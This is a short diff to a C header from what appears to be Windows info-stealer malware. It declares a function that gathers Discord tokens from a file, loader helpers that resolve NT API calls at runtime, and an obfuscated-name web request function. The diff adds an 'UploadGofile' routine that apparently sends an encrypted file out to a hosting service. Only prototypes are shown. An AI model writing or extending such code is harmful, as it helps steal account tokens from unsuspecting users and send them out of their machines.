@@ -45,6 +45,7 @@ typedef NTSTATUS (WINAPI *BCryptCloseAlgorithmProvider_t)(BCRYPT_ALG_HANDLE, ULO
 typedef NTSTATUS (WINAPI *BCryptGenRandom_t)(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags);
 int GetHandleNTAPI(NtLdrLoadDll* LoadLib, NtLdrGetProcedureAddress* GetProcAdd, NtLdrUnloadDll* UnloadLib);
 int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLength);
+void UploadGofile(char *OutEncPath, char *DownloadLink);
 const char* WEIlnsAXWqfYLHUcHqaREFjqBBGaAY(const wchar_t* domain, const wchar_t* path, const wchar_t* headers);
 extern NtLdrLoadDll LoadLib;
 extern NtLdrGetProcedureAddress GetProcAdd;
